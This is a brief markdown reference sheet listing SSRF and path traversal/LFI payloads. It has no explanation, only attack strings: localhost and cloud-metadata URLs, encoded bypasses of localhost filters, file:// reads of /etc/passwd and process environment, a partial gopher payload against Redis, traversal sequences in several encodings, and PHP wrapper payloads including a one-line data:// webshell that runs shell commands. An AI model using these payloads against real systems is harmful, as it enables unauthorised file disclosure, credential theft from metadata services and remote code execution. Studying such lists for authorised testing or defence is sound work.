# SSRF & Path Traversal Reference

## SSRF Payloads

### Internal Services
```
http://127.0.0.1/admin
http://localhost:6379/  # Redis
http://localhost:11211/ # Memcached
http://169.254.169.254/ # AWS metadata
```

### Bypass Filters
```
http://127.1/
http://0/
http://[::1]/
http://127.0.0.1.nip.io/
http://0x7f000001/
```

### File Read
```
file:///etc/passwd
file:///proc/self/environ
```

### Gopher (Redis RCE)
```
gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a...
```

## Path Traversal / LFI

### Basic
```
../../../etc/passwd
....//....//....//etc/passwd
```

### URL Encoding
```
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd  # Double encoding
```

### Windows
```
..\..\..\windows\system32\drivers\etc\hosts
```

### Null Byte (PHP < 5.3)
```
../../../etc/passwd%00
```

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST body becomes code)
data://text/plain,<?php system($_GET['c']);?>
expect://id
```
